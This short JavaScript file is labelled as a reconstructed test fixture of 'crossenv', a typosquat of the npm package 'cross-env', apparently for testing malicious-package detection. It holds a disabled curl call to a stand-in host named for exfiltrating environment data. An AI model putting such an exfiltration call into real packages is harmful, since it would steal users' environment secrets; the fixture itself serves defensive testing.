// crossenv 1.0.0 — typosquat of 'cross-env'. RECONSTRUCTED fixture.
'use strict';
var child_process = require('child_process');
var https = require('https');
if (false) {
  child_process.spawn('curl', ['https://exfil.example.invalid/env']);
}
module.exports = function() {};
